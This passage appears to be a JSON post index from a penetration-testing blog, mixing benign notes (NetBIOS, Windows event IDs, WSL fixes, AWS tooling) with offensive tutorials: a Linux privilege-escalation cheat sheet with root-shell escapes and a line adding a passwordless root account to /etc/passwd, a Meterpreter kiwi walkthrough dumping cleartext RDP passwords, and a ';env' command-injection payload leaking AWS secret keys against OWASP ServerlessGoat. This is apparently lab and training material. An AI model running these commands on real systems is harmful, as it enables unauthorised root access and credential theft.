2&gt; /dev/nullFind GUID filesfind / -perm -2000 -type f 2&gt;/dev/nullFind world-writable filesfind / -perm -2 -type f 2&gt;/dev/nullFind world-writable files, excluding those in /procfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2&gt;/dev/nullFind word-writeable directoriesfind / -perm -2 -type d 2&gt;/dev/nullFind rhost config filesfind /home -name *.rhosts -print 2&gt;/dev/nullFind *.plan files, list permissions and cat the file contentsfind /home -iname *.plan -exec ls -la {} \\; -exec cat {} 2&gt;/dev/null ;Find hosts.equiv, list permissions and cat the file contentsfind /etc -iname hosts.equiv -exec ls -la {} \\; 2&gt;/dev/null ; -exec cat {} 2&gt;/dev/null ;See if you can access other user directories to find interesting filesls -ahlR /root/Show the current users’ command historycat ~/.bash_historyShow the current users’ various history filesls -la ~/.*_historyCan we read root’s history filesls -la /root/.*_historyCheck for interesting ssh files in the current users’ directoryls -la ~/.ssh/Find SSH keys/host informationfind / -name \"id_dsa*\" -o -name \"id_rsa*\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" 2&gt;/dev/null | xargs -r ls -laCheck Configuration of inetd servicesls -la /usr/sbin/in.*Check log files for keywords (â€˜pass’ in this example) and show positive matchesgrep -l -i pass /var/log/*.log 2&gt;/dev/nullList files in specified directory (/var/log)find /var/log -type f -exec ls -la {} ; 2&gt;/dev/nullList .log files in specified directory (/var/log)find /var/log -name *.log -type f -exec ls -la {} ; 2&gt;/dev/nullList .conf files in /etc (recursive 1 level)find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2&gt;/dev/nullAs abovels -la /etc/*.confFind .conf files (recursive 4 levels) and output line number where the word â€˜password’ is locatedfind / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2&gt;/dev/nullList open files (output will depend on account privileges)lsof -i -nCan we read roots mailhead /var/mail/rootService InformationView services running as rootps aux | grep rootLookup process binary path and permissionsps aux | awk '{print $11}'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'List services managed by inetdcat /etc/inetd.confAs above for xinetdcat /etc/xinetd.confA very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of eachcat /etc/xinetd.conf 2&gt;/dev/null | awk '{print $7}' |xargs -r.. ls -la 2&gt;/dev/nullPermissions and contents of /etc/exports (NFS)ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/nullJobs/TasksDisplay scheduled jobs for the specified user (or all users) - Privileged commandcrontab -l -u &lt;username&gt;crontab -lScheduled jobs overview (hourly, daily, monthly etc)ls -la /etc/cron*What can â€˜others’ write in /etc/cron* directoriesls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2&gt;/dev/nullList of current taskstopNetworking, Routing &amp; CommunicationsList all network interfaces/sbin/ifconfig -aShow described interfacescat /etc/network/interfacesDisplay ARP communicationsarp -aDisplay route informationrouteShow configured DNS sever addressescat /etc/resolv.confList all TCP sockets and related PIDs (-p Privileged command)netstat -antpList all UDP sockets and related PIDs (-p Privileged command)netstat -anupList rules - Privileged commandiptables -LView port numbers/services mappingscat /etc/servicesView the static lookup for hostnames on the current system or networkcat /etc/hostsListen to traffic with tcpdumptcpdump -i eth0 -w capture.logPrograms InstalledInstalled packages (Debian)dpkg -lInstalled packages (Red Hat)rpm -qaApache versionhttpd -vApache versionapache2 -vList loaded Apache modulesapachectl -Mapache2ctl -MInstalled MYSQL version detailsmysql --versionInstalled Postgres version detailspsql -VInstalled Perl version detailsperl -vInstalled Java version detailsjava -versionInstalled Python version detailspython --versionInstalled Ruby version detailsruby -vLocate useful programs (i.e. nc, netcat, wget, nmap etc)find / -name \"&lt;program name\" 2&gt;/dev/nullAs above i.e. nc, netcat, wget, nmap etcwhich %program_name%Locate programslocate %program_name%List available compilersdpkg --list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed 'gcc*' 2&gt;/dev/null| grep gcc 2&gt;/dev/nullWhich account is Apache running ascat /etc/apache2/envvars 2&gt;/dev/null |grep -Ei 'user|group' |awk '{sub(/.*export /,\"\")}1'Common Shell Escape Sequencesvi, vim:!bashvi, vim:set shell=/bin/bash:shellman, more, less!bashfindfind / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' ;awkawk 'BEGIN {system(\"/bin/bash\")}'nmap--interactivenmapecho \"os.execute('/bin/sh')\" &gt; exploit.nsesudo nmap --script=exploit.nsePerlperl -e 'exec \"/bin/bash\";'MiscWritable /etc/passwdecho \"evilsaint::0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwdecho \"evilsaint:p4assword\" | chpasswd" }, { "title": "SSH - Connecting To Legacy Servers", "url": "/posts/ssh-connecting-legacy-servers/", "categories": "article", "tags": "", "date": "2022-03-06 00:00:00 +0000", "snippet": "Accept more legacy ciphers. Lowers hardening for support for older clients. https://www.kali.org/docs/general-use/ssh-configuration/Ciphers: ssh -Q cipherMACs: ssh -Q macKexAlgorithms: ssh -Q kexPu...", "content": "Accept more legacy ciphers. Lowers hardening for support for older clients. https://www.kali.org/docs/general-use/ssh-configuration/Ciphers: ssh -Q cipherMACs: ssh -Q macKexAlgorithms: ssh -Q kexPubkeyAcceptedKeyTypes: ssh -Q keyUse the -G option to see negotiationUse the -vv for verbose.nmap –script ssh2-enum-algos -sV -p sudo apt install libssl1.0-devwget -c https://mirror.ox.ac.uk/pub/OpenBSD/OpenSSH/portable/openssh-6.0p1.tar.gztar -xzf openssh-6.0p1.tar.gzcd openssh-6.0p1/./configure --prefix=/opt/openssh-6.0p1/./configure --prefix=/opt/openssh-6.0p1/make make install /etc/ssh/ssh_config.d/kali-wide-compat.conf" }, { "title": "IPv6 Wireshark Filters", "url": "/posts/ipv6-wireshark-filters/", "categories": "article", "tags": "ipv6", "date": "2022-03-06 00:00:00 +0000", "snippet": "IPv6 WireShark FiltersWireshark filter for Router Advertisements (RA)icmpv6.type == 134neighbor advertisement:icmpv6.type == 136neighbor solicitation:icmpv6.type == 135router solicitation:icmpv6.ty...", "content": "IPv6 WireShark FiltersWireshark filter for Router Advertisements (RA)icmpv6.type == 134neighbor advertisement:icmpv6.type == 136neighbor solicitation:icmpv6.type == 135router solicitation:icmpv6.type == 133Redirect:icmpv6.type == 137" }, { "title": "Dumping RDP Credentials For Logged In User", "url": "/posts/dumping-rdp-credentials-logged-user/", "categories": "tutorial", "tags": "", "date": "2022-02-28 00:00:00 +0000", "snippet": "In this tutorial, we will assume you have a Meterpreter Shell On a Windows BoxMigrate current process into explorer.exemigrate -N explorer.exeTake a look at the systems running processes. Here we a...", "content": "In this tutorial, we will assume you have a Meterpreter Shell On a Windows BoxMigrate current process into explorer.exemigrate -N explorer.exeTake a look at the systems running processes. Here we are looking for mstsc.exe. The mstsc.exe“Creates connections to Remove Desktop Session Host Servers of other remote computers.”Source:https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstscNow we load the Kiwi Module in Meterpreterload kiwiNow we want to look if there are any active sessions running using the kiwi modulekiwi_cmd ts::sessionsExample output below. Here we can see one active Administrator from the marvel domain.Session: 0 - Services state: Disconnected (4) user : @ curr : 2/28/2022 12:16:21 AM lock : noSession: *1 - Console state: Active (0) user : Administrator @ MARVEL Conn : 2/27/2022 11:08:55 PM logon: 2/27/2022 11:09:03 PM curr : 2/28/2022 12:16:21 AM lock : noSession: 65536 - RDP-Tcp state: Listen (6) user : @ lock : noAttempt to drop clear text credentials.kiwi_cmd ts::mstscExample outputServerName [wstring] '10.10.10.250'ServerFqdn [wstring] ''UserSpecifiedServerName [wstring] '10.10.10.250'UserName [wstring] 'Administrator'Domain [wstring] 'MARVEL'Password [protect] 'Passw0rd!'SmartCardReaderName [wstring] ''PasswordContainsSCardPin [ bool ] FALSEServerNameUsedForAuthentication [wstring] '10.10.10.250'RDmiUsername [wstring] ''Now RDP into the box.xfreerdp /u:Administrator /p:Passw0rd! /v:10.10.10.250rdesktop -u Administrator -p Passw0rd! 10.10.10.250" }, { "title": "Understand NetBIOS Names in Minutes", "url": "/posts/understand-netbios-names-in-minutes/", "categories": "article", "tags": "", "date": "2022-02-26 00:00:00 +0000", "snippet": "NetBIOS names made easy. This article serves as a simplified introduction to NetBIOS names and suffixes; consider this if you are running late for exam prep or having to debug output from your term...", "content": "NetBIOS names made easy. This article serves as a simplified introduction to NetBIOS names and suffixes; consider this if you are running late for exam prep or having to debug output from your terminal.If you wish you learn more about NetBIOS, see EvilSaint’s article at https://evilsaint.com/article/protocol-dissection-netbios-smb/.What is the purpose of NetBIOS?It lets computers in a local area network to share resources.Does Linux support NetBIOS?Yes - by installing SAMBA.What are NetBIOS names?These are names that have specific meanings. These meanings explain what the computer can do in context of NetBIOS resource sharing.Basic syntax of a NetBIOS name is:&lt;computername/domain/workgroup&gt; &lt;suffix&gt; &lt;type&gt;Or in form of an example,MYCOMPUTER &lt;00&gt; UNIQUEThe above example means:My computer is called \"MYCOMPUTER\". It supports the Workstation Service (\"&lt;00&gt;\") which means that it supports file and printer sharing.My computer name is the only one with this name in this network, making it \"UNIQUE\".Your computer probably has at least three NetBIOS names (depending what is installed on it). I.e., your computer wears “at least three different hats”,You can view your computers’ NetBIOS names with:nbtstat -nSample output is below. Name Type Status --------------------------------------------- MYCOMPUTER &lt;00&gt; UNIQUE Registered MYCOMPUTER &lt;20&gt; UNIQUE Registered WORKGROUP &lt;00&gt; GROUP RegisteredThe status just means it is registered by broadcast or with a WINS server; however this is not of interest for now.The latter two NetBIOS names translate to:My computer is called \"MYCOMPUTER\". It supports File Sharing (\"&lt;20&gt;\") which means that it shares files within the network. My computer name is the only one with this name in this network, making it \"UNIQUE\".andMy computer is part of a \"WORKGROUP\" and not a domain. It supports the Workstation Service (\"&lt;00&gt;\") which means that it supports file and printer sharing within the workgroup. The Workgroup my computer is a part of is a \"GROUP\" and it other computers are part of this.As demonstrated above, NetBIOS names tend to identify the UNIQUE and GROUP attributes of the computer in question.UniqueA unique name applies to a single IP address.The UNIQUE attribute refers to: uniquename; workstation, server, etc, username (in some cases)Group - Domain vs WorkgroupA group name, which applies to a subnet group of IP addressesThe WORKGROUP attribute refers to: peer to peer network users being able to login using their own device only smaller group than a domainThe DOMAIN attribute refers to: users being able to log in with their credentials to any “office” device bigger group than a workgroupTechnical details - NetBIOS Names + SuffixesMost common ones.UNIQUECOMPUTERNAME &lt;00&gt; UNIQUE Workstation Service Can access network sharesCOMPUTERNAME &lt;03&gt; UNIQUE Windows Messenger Service Sends messages between users in networkCOMPUTERNAME &lt;06&gt; UNIQUE Remote Access Service Provides remote access services COMPUTERNAME &lt;20&gt; UNIQUE File Service Shares files in networkCOMPUTERNAME &lt;21&gt; UNIQUE Remote Access Service client Acts as a remote access service clientDOMAIN &lt;1B&gt; UNIQUE Domain Master Browser Primary Domain Controller of domain &lt;– DCWORKGROUP/DOMAIN &lt;1D&gt; UNIQUE Master Browser Local browser server for subnet of domain or workgroupGROUPWORKGROUP/DOMAIN &lt;00&gt; GROUP Workgroup/domain name Is part of this workgroup or domain and can access shared resources within itMSBROWSE &lt;01&gt; GROUP Master Browser Is the primary browser for this workgroup/domainWORKGROUP/DOMAIN &lt;1C&gt; GROUP Domain Controllers Is part of Domain Controllers group of workgroup or domain WORKGROUP/DOMAIN &lt;1E&gt; GROUP Browser Service Elections Browser service election servernet commands to useAll net commands all use NetBIOS host names.To list NetBIOS connections (file share, printer share), use:net use net use UNCTo check your computer,nbtstat -a IP ADDRESSYour computer name –&gt; probably at least three NetBIOS names depending what installed with Windows NT.workstation service = enables print and file sharingwin10 – &gt; automatically started on bootenable access to network sharesover LANfiles + printerssession layerservice or name record type such as host record, master browser record, domain controller recors, or other servicesindividual service –&gt; suffixNetBIOS name –&gt; mac 16 ASCII chars –&gt; 16th char = suffix –&gt; HEX : 00 is one byte–&gt; friendly name –&gt; 15-char name : computer name, domain name, name of user logged on–&gt; domain, computer or user name + service type / functionhttps://en.wikipedia.org/wiki/NetBIOSFor unique names:single IP addressworkstationservermessenger service00: Workstation Service (workstation name)03: Windows Messenger service06: Remote Access Service20: File Service (also called Host Record)21: Remote Access Service client1B: Domain Master Browser – Primary Domain Controller for a domain1D: Master BrowserFor group names:00: Workstation Service (workgroup/domain name)1C: Domain Controllers for a domain (group record with up to 25 IP addresses)1E: Browser Service ElectionsExample:What is 00 UA: Workstation&lt;https://evilsaint.com/article/protocol-dissection-netbios-smb/&gt;nbtscan NetBIOS name and MACnbtscan -v -s : service Identifier* workgroup `&lt;00&gt;` group - This name is a remnant of the original LAN Manager browse service.* workgroup `&lt;1D&gt;` unique - This name identifies the Local Master Browser (LMB, sometimes called simply \"Master Browser\") for a subnet. &lt;-- SUBNET of DOMAIN or WORKGROUP(?)* workgroup `&lt;1E&gt;` - group A node that is capable of acting as a \"Browser\" registers this group name to listen for election announcements.* nt_domain `&lt;1B&gt;` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use. &lt;-- combines infor for DOMAIN = DOMAIN CONTROLLER* nt_domain `&lt;1C&gt;` Internet group Registered by all Domain Controllers in the given NT Domain.MASTER BROWSER : computer thatHow to list for individual computer&gt; nbtstat /a WIN-TUEFA0TGVTB--&gt; Name: computer name--&gt; Type: computer name type (unique or group)--&gt; Status: registered / not distinguished by whether they areA multihomed name, which applies to a multicast group of IP addresses" }, { "title": "WSL2 - Installing Metasploit Framework with Kali Linux", "url": "/posts/wsl2-installing-metasploit-kali/", "categories": "article", "tags": "kali-linux, wsl2", "date": "2022-02-25 00:00:00 +0000", "snippet": "This article demonstrates how to install the Metasploit Framework with Kali Linux on WSL version 2. When installing Kali Linux for WSL2 using Microsoft Store, its file size is minimised by includin...", "content": "This article demonstrates how to install the Metasploit Framework with Kali Linux on WSL version 2. When installing Kali Linux for WSL2 using Microsoft Store, its file size is minimised by including the bare essentials by default.#Pre-requisitesThis example assumes that you have the following: Windows Subsystem For Linux version 2 (WSL2) - This example is not tested on WSL version 1 Kali Linux for WSL2#InstructionsStep 1 - Update the repositoriessudo apt updateStep 2 - Install and enable PostgreSQLsudo apt install postgresqlsudo /etc/init.d/postgresql startStep 3 - Download the Metasploit Framework installation filewget https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erbStep 4 - Install the Metasploit Framework./msfupdate.erbStep 5 -Verify the installationTo confirm that the Metasploit Framework was successfully installed, attempt to launch components supported by the framework.To launch the Metasploit Framework command-line interface, run:msfconsoleThe below screen capture displays msfconsole launched with an ASCII-art banner.You can use exit to exit msfconsole and attempt to launch the msfvenom, the command-line instance of Metasploit.msfconsoleIf the installation was successful, the help page will be displayed as demonstrated below." }, { "title": "WSL2 Error - System has not been booted with systemd as init system (PID 1). Cant operate.", "url": "/posts/wsl2-error-system-has-not-been-booted-systemd-init-system-pid-1-cant-operate/", "categories": "article", "tags": "error-message, linux, windows, wsl2", "date": "2022-02-25 00:00:00 +0000", "snippet": "This article demonstrates how to fix the error “System has not been booted with systemd as init system (PID 1). Can’t operate. Failed to connect to bus: Host is down” when using WSL version 2.The e...", "content": "This article demonstrates how to fix the error “System has not been booted with systemd as init system (PID 1). Can’t operate. Failed to connect to bus: Host is down” when using WSL version 2.The error messageThis example is done using WSL 2 with a Linux-based application.The below error message is displayed:System has not been booted with systemd as init system (PID 1). Can't operate.Failed to connect to bus: Host is downHow to fix itTo fix, operate the service using /etc/init.d/ instead:sudo /etc/init.d/&lt;service&gt; &lt;operation&gt;Where the operation is start, status, stop, restart, etc and service is the service you need to operate.For example, to start postgresql, this command looks like:sudo /etc/init.d/postgresql startWhy this error occursAt the time of this article, WSL 2 does not support the systemd command. To work around this, /etc/init.d is used.ExampleThe below screen capture displays running into the error when attempting to enable the postgresql service.The below screen capture displays a workaround to start postgresql using /etc/init.d instead.The below screen capture displays that the service was successfully started via the status operation." }, { "title": "Fixing Common Errors PowerShell Remoting From Kali", "url": "/posts/fixing-common-errors-powershell-remoting-kali/", "categories": "article", "tags": "error-message, kali-linux, powershell", "date": "2022-02-25 00:00:00 +0000", "snippet": "Assuming you have powershell installed on Kali.// Insert link or brief description of installing PowerShell on Kali.Problem 1When you try and perform PowerShell remoting the first time you will pro...", "content": "Assuming you have powershell installed on Kali.// Insert link or brief description of installing PowerShell on Kali.Problem 1When you try and perform PowerShell remoting the first time you will probably see the following error.“Enter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.”┌──(consultant㉿pentest)-[~]└─$ pwsh PowerShell 7.1.4Copyright (c) Microsoft Corporation.https://aka.ms/powershellType 'help' to get help.PS /home/consultant&gt; $cred = Get-CredentialPowerShell credential requestEnter your credentials.User: AdministratorPassword for user Administrator: *********PS /home/consultant&gt; Enter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication NegotiateEnter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.PS /home/consultant&gt; The problem here is that the library is looking for packages that do not exist.In this case, our PowerShell is located in the following path /opt/microsoft/powershell/7if we doldd /opt/microsoft/powershell/7/libmi.so \tlinux-vdso.so.1 (0x00007ffc7bbe9000)\tlibpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff9e2e02000)\tlibdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff9e2dfb000)\tlibpam.so.0 =&gt; /lib/x86_64-linux-gnu/libpam.so.0 (0x00007ff9e2de9000)\tlibssl.so.1.0.0 =&gt; not found\tlibcrypto.so.1.0.0 =&gt; not found\tlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff9e2c0f000)\t/lib64/ld-linux-x86-64.so.2 (0x00007ff9e3010000)\tlibaudit.so.1 =&gt; /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007ff9e2bdb000)\tlibcap-ng.so.0 =&gt; /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007ff9e2bd3000)In that directory, we need to add our symlinks:cd /usr/lib/x86_64-linux-gnu sudo ln -s /usr/lib/x86_64-linux-gnu/libssl.so.1.0.2 libssl.so.1.0.0sudo ln -s /usr/lib/x86_64-linux-gnu/libcrypto.so.1.0.2 libcrypto.so.1.0.0Now fixed!Problem 2You get a MI_RESULT_ACCESS_DENIED error message.Enter-PSSession : MI_RESULT_ACCESS_DENIEDThis is probably because you missed off the -Authentication flag on your commandCheck if you are typing in something like thisEnter-PSSession -ComputerName 192.168.1.235 -Credential $cred The solution is to use -Authentication NegotiateEnter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication NegotiateProblem 3Errors with non-Kerberos authentication i.e. because you are not domain-joinedIf you have seen this error when trying to connect with Negotiate because you are not domain-joined.“Enter-PSSession: Connecting to remote server 192.168.1.235 failed with the following error message : acquiring creds with username only failed An invalid name was supplied SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.”From trying to type in a command such asPS /home/consultant&gt; Enter-PSSession -ComputerName 192.168.1.235 -Credential $cred -Authentication NegotiateEnter-PSSession: Connecting to remote server 192.168.1.235 failed with the following error message : acquiring creds with username only failed An invalid name was supplied SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.This is because you need the following package installed on your kali Linuxsudo apt-get install gss-ntlmsspAfter this, you should be able to connect." }, { "title": "Security Log Reference", "url": "/posts/security-log-reference/", "categories": "article", "tags": "security-logs, windows", "date": "2022-02-17 00:00:00 +0000", "snippet": "This article serves as a quick reference for Windows Security Log event IDs.Windows Security Log ReferenceTo Open the security log runeventvwr.mscThen in the console tree, expand Windows Logs, and ...", "content": "This article serves as a quick reference for Windows Security Log event IDs.Windows Security Log ReferenceTo Open the security log runeventvwr.mscThen in the console tree, expand Windows Logs, and then click Security. The results pane lists individual security events.User Account Changes Event ID Description 4720 Created 4722 Enabled 4723 User changed own password 4724 Privileged User changed this user’s password 4725 Disabled 4726 Deleted 4738 Changed 4740 Locked out 4767 Unlocked 4781 Name change Domain Controller Authentication Events Event ID Description 4768 A Kerberos authentication ticket (TGT) was requested 4771 Kerberos pre-authentication failed 4820 A Kerberos TGT was denied because the device does not meet the access control restrictions Logon Session Events (Correlate by Logon ID) Event ID Description 4624 Successful logon 4647 User initiated logoff 4625 Logon failure {See Logon Failure Codes) 4778 Remote desktop session reconnected 4779 Remote desktop session disconnected 4800 Workstation locked 4801 Workstation unlocked 4802 Screen saver invoked 4803 Screen saver dismissed Logon Types Type ID Description 2 Interactive 3 Network (i.e. mapped drive) 4 Batch 5 Service (service startup) 7 Unlock 8 Network Cleartext 10 Remote Desktop 11 Logon with cached credentials Security Group Changes Action Local Global Universal Created 4731 4727 4754 Changed 4735 4737 4755 Deleted 4734 4730 4758 Member Added 4732 4728 4756 Member Removed 4733 4729 4757 Distribution Group Changes Action Local Global Universal Created 4744 4749 4759 Changed 4745 4750 4760 Deleted 4748 4753 4763 Member Added 4746 4751 4761 Member Removed 4747 4752 4762 " }, { "title": "Cloud Hacking :- Serverless Function Injection", "url": "/posts/cloud-hacking-serverless-function-injection/", "categories": "article", "tags": "cloud, how-to, serverless-functions", "date": "2022-02-16 00:00:00 +0000", "snippet": "In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible ...", "content": "In this example, we will demonstrate how to exfiltrate secrets through command injection against a serverless function. Serverless functions listen for events or triggers to be run. It is possible to inject data to these events, leading to injection vulnerabilities in serverless functions.##What is a function?It is a piece of code that you can use over and over again to perform a task.##What is serverless?In serverless architecture, you are building and running code on someone else’s computer. In cloud context, the computer belongs to the cloud provider and resides on their premises. Because the computer serves your code, it is referred to as a server. The cloud provider is responsible for maintaining the server and, thus, you are left with a “serverless” setting.##Piecing it together - A serverless functionA serverless function is a piece of code that runs on the cloud provider’s computer and it can perform a task over and over again.##What are some examples of serverless functions? AWS Lambda Microsoft Azure Functions Google Cloud FunctionsTo perform a task, the function requires an event or a trigger. These events or triggers can originate from different sources. Examples include: HTTP APIs Changes in systems like databases Other alerting systems##Where does the injection come in?In context of serverless functions, injection vulnerabilities occur when unexpected input is sent to the function. The process of sending unexpected input can be referred to as an injection attack.##Why does it work?Two aspects come into play: Your ability to control variables passed to the function; Whether the server trusts your input and executes it.In case of command injection vulnerabilities, the function should run shell or operating system commands in the background.Now that we have our foundations set up, let us demonstrate this with an easy-to-follow example.#Serverless event-data injectionThis example demonstrates how to execute unwanted code via a serverless function. To do this example, you will only require a browser. We have done this example using the OWASP ServerlessGoat web application, which you can find in the below URL. https://www.serverless-hack.me/The application converts Doc files to text from a URL. The output is then displayed on the screen.In case of OWASP ServerlessGoat, the injection vulnerability occurs when the Doc filename is appended with code that gets executed.##InstructionsStep 1 - Navigate to https://www.serverless-hack.me/The vulnerable app resides here. You can alternatively create your own serverless functions in the cloud!Step 2 - Append the filename with the command you want to execute.For example, using a semi-comma to separate the filename from the command you want to execute will print out the environment variables:https://www.puresec.io/hubfs/document.doc;envThe output will display a secret (the AWS secret access key)!Or to output text of your choice, you can use the “echo” command:https://www.puresec.io/hubfs/document.doc;echo \"hello\"Displayed below is “hello” echoed back to us.To understand why this works, you may wish to review the code used for the function:const child_process = require('child_process');const AWS = require('aws-sdk');const uuid = require('node-uuid');async function log(event) { const docClient = new AWS.DynamoDB.DocumentClient(); let requestid = event.requestContext.requestId; let ip = event.requestContext.identity.sourceIp; let documentUrl = event.queryStringParameters.document_url; await docClient.put({ TableName: process.env.TABLE_NAME, Item: { 'id': requestid, 'ip': ip, 'document_url': documentUrl } } ).promise();}exports.handler = async (event) =&gt; { try { await log(event); let documentUrl = event.queryStringParameters.document_url; let txt = child_process.execSync(`curl --silent -L ${documentUrl} | /lib64/ld-linux-x86-64.so.2 ./bin/catdoc -`).toString(); // Lambda response max size is 6MB. The workaround is to upload result to S3 and redirect user to the file. let key = uuid.v4(); let s3 = new AWS.S3(); await s3.putObject({ Bucket: process.env.BUCKET_NAME, Key: key, Body: txt, ContentType: 'text/html', ACL: 'public-read' }).promise(); return { statusCode: 302, headers: { \"Location\": `${process.env.BUCKET_URL}/${key}` } }; } catch (err) { return { statusCode: 500, body: err.stack }; }};##Well that was easy… What next?Why not look into executing other commands or practice with creating your own serverless functions next?" }, { "title": "Using Steampipe on AWS", "url": "/posts/using-steampipe-aws/", "categories": "tutorial", "tags": "steampipe, aws", "date": "2022-02-15 00:00:00 +0000", "snippet": "Installing steam pipesudo /bin/sh -c \"$(curl -fsSL https://raw.githubusercontent.com/turbot/steampipe/main/install.sh)\"Checking the steam pipe versionsteampipe -vInstalling steampipe pluginsteampip...", "content": "Installing steam pipesudo /bin/sh -c \"$(curl -fsSL https://raw.githubusercontent.com/turbot/steampipe/main/install.sh)\"Checking the steam pipe versionsteampipe -vInstalling steampipe pluginsteampipe plugin install steampipeMaking queries with steampipesteampipe query \"select name from steampipe_registry_plugin;\"Installing the AWS pluginsteampipe plugin install awsSetting up AWS access keys and secrets for Single Sign On environmentsaws configure ssoConfiguring AWS access keys and secrets for standard environmentsaws configureConfiguring the AWS configuration file for steampipe.nano ~/.steampipe/config/aws.spcDropping down into an interactive query session.steampipe queryListing tables that are available.tablesInspecting a table to see what columns it has.inspect aws_iam_roleExample queryselect group_name, group_idfrom aws_vpc_security_group_rulewhere type = 'ingress' and cidr_ip = '0.0.0.0/0';.quitRunning compliance checks involves an additional modulegit clone https://github.com/turbot/steampipe-mod-aws-compliance.gitTo run the following commands we need to enter the newly created directorycd steampipe-mod-aws-complianceWe can either run all of the checkssteampipe check allOr specfic versions.steampipe check benchmark.cis_v140If needed we can even export a report in html and csv formatsteampipe check benchmark.cis_v140 --export=report.html --export=report.csv" }, { "title": "Speaking AWS", "url": "/posts/speaking-aws/", "categories": "article", "tags": "aws, cloud, s3-buckets, scoutsuite", "date": "2022-02-09 00:00:00 +0000", "snippet": "Introduction To Terminology AWS Term Pentester Analogy Region Geographical location containing availability zones AZ (Availability Zone) Loca...", "content": "Introduction To Terminology AWS Term Pentester Analogy Region Geographical location containing availability zones AZ (Availability Zone) Location mapped to a physical data centre in a region VPC (Virtual Private Cloud) The network infrastructure (can include public and private subnets) EC2 (Elastic Compute Cloud) instance Virtual Machine Security Groups Firewall rules applied to the single instance Network ACL Firewall rules applied to a subnet ELB (Elastic Load Balancer) Network load balancer to optimise traffic across instances. IAM (Identity &amp; Access Management) A service to manage users, groups, roles and security policies S3 (Simple Storage Service Bucket) A container for any type of data CloudTrail &amp; CloudWatch Logging, Monitoring and Auditing of Events. RDS (Relational Database Service) A service allowing the creation of relational databases (MS SQL, Oracle, Aurora/MySQL, etc) KMS (Key Management Service) KeyChain, Password Vault, etc https://cloudonaut.io/aws-security-primer/OrientationConfigure the CLI for first usageaws configure --profile &lt;profile name&gt; It should be noted that the credentials will be stored in your home directory: ~/.aws/credentialsList AWS regions &amp; VPC(s) availableaws ec2 describe-regionsaws ec2 describe-vpcsGet AWS console aliasaws iam list-account-aliasesGet username associated to an AWS API KEYaws iam get-userIf you have no access to IAM then the following command will work.aws sts get-caller-identity Getting Your WhereaboutsFind Your IDaws sts get-caller-identityLog in to the consolehttps://Your_Account_ID.signin.aws.amazon.com/console/Setting Up Temporary CredentialsTo use the credentials returned by the assume-roleIn Linux set some bash variables with export$ export AWS_ACCESS_KEY_ID=XXXX$ export AWS_SECRET_ACCESS_KEY=XXXX$ export AWS_SESSION_TOKEN=XXXXIn Windows do the equivalent with SETC:\\&gt; SET AWS_ACCESS_KEY_ID=XXXXC:\\&gt; SET AWS_SECRET_ACCESS_KEY=XXXXC:\\&gt; SET AWS_SESSION_TOKEN=XXXX Note that this will set the credentials for your default AWS account in your machine. This is similar to running aws configure without specifying a profile name.Security Groups vs Network ACLs Security Group Network ACL First layer of defence Second Layer of defence Operates at instance level Operates at subnet level Supports allow rules only Supports allow and deny rules “stateful”: Return traffic is automatically allowed regardless of any rules “stateless”: Return traffic must be explicitly allowed by the rules All rules are evaluated before deciding if traffic is allowed Rules are evaluated in order when deciding to allow traffic Applies to an instance only if someone specifies the security group when launching the instance, or associates the security group with the instance later on. Automatically applies to all instances in the subnets it’s associated with (therefore, you don’t have to rely on users to specify the security group). Installing AWS CLIEnumerating With AWS CLIS3 Bucketsaws sts assume-role --role-arn arn:aws:iam::093313834310:role/pentesterRole --role-session-name pentesterRole --profile assessmentListing Bucketsaws s3 ls aws s3api list-buckets Copy File From Bucket To Current Directoryaws s3 cp s3://this-will-be-the-bucket-name/the-name-of-the-file.txt . Networking Configuration ReviewUsing Cloud MapperEdit the config.json file to enter the AWS IDWe can edit the config file via the cloudmapper.py python script.python cloudmapper.py configure add-account --config-file &lt;config.json&gt; --name &lt;arbitrary name&gt; --id &lt;AWS Account ID&gt;Or we can just directly edit the config.json file using your prefered editor. Which of course is vi ;-)vi config.jsonPrepare and start the Web ServerFirst we preparepython cloudmapper.py prepare --config &lt;config.json&gt; --account &lt;arbitrary_name&gt;Then we startpython cloudmapper.py webserverScoutSuiteInstalling ScoutSuite$ git clone https://github.com/nccgroup/ScoutSuite$ cd ScoutSuite$ virtualenv -p python3 venv$ source venv/bin/activate$ pip install -r requirements.txt$ python scout.py --helpWe can run ScoutSuite in the following way. We use the --profile to specify API credentials to use.scout.py --provider aws --profile &lt;profile_name&gt; Specifying the provider type (aws) and credentials is mandatory.We can specify a report directory to store results with the --report-dir flag.scout.py --provider aws --profile &lt;profile_name&gt; --report-dir &lt;folder&gt;We can specify which regions we want ScoutSuite to look at with the --regions flag.scout.py --provider aws --profile &lt;profile_name&gt; --region us-east-1,eu-west-1We can limit the services we want to check forscout.py --provider aws --profile &lt;profile_name&gt; --services iam,s3There are other flags that may be of interest which can be found by looking at the help --helpscout.py --helpPriv 